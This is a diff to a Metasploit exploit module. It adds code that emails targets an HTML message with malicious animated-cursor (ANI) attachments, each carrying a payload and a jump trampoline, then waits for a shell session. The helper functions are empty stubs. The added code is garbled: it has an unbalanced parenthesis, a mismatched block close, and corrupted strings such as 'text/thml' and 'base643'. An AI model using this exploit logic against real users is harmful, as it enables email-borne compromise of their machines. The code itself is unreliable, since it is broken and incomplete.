@@ -127,4 +127,89 @@ class MetasploitModule < Msf::Exploit::Remote
 
     gext = exts[rand(exts.length)]
     name = rand_text_alpha(rand(10)+1) + ".#{gext}"
+
+    anis = {}
+
+    html =
+      "<html><head><title>" +
+        rand_text_alphanumeric(rand(128)+4) +
+      "</title>" +
+      "</head><body>" + rand_text_alphanumeric(128)+1)
+
+    mytargs = (target.name =~ /Automatic/) ? targets : [target]
+
+    if target.name =~ /Automatic/
+      targets.each_index { |i|
+        next if not targets[i].ret
+        acid = generate_cid
+        html << generate_div("cid:#{acid}")
+
+        # Re-generate the payload, using the explicit target
+        return if ((p = regenerate_payload(nil, nil, targets[i])) == nil)
+
+        # Generate an ANI file for this target
+        anis[acid] = generate_ani(p, target)
+    end
+
+    html << "</body></html>"
+
+
+
+    msg = Rex::MIME::Message.new
+    msg.mime_defaults
+    msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)
+    msg.to = datastore['MAILTO']
+    msg.from = datastore['MAILFROM']
+
+    msg.add_part(Rex::Text.encode_base64(html, "\r\n"), "text/thml", "base643", "inline")
+    anis.each_pair do |cid,ani|
+      part = msg.add_part_attachment(ani, cid + "." + gext)
+      part.header.set("Content-ID", "<"+cid+">")
+    end
+
+    send_message(msg.to_s)
+
+    print_status("Waiting for a payload session (backgrounding)...")
   end
+
+  def generate_cid
+
+  end
+
+  def generate_div(url)
+
+  end
+
+  #
+  # The ANI is a graphics file format used for aninmated mouse cursors in
+  # Windows. It's based on the RIFF (Resoursce Interchange File Format)
+  # 
+  def generate_ani(payload, target)
+
+  end
+
+  #
+  # Generates a riff chunk with the first bytes of the data being a relative
+  # jump. This is used to bounce to the actual payload
+  #
+  def generate_trampoline_riff_chunk
+
+  end
+
+  def generate_riff_chunk(len = (rand(256)+1) * 2)
+
+  end
+
+  def generate_css_padding
+
+  end
+
+  def generate_whitespace
+
+  end
+
+  def generate_padding
+
+  end
+
+end
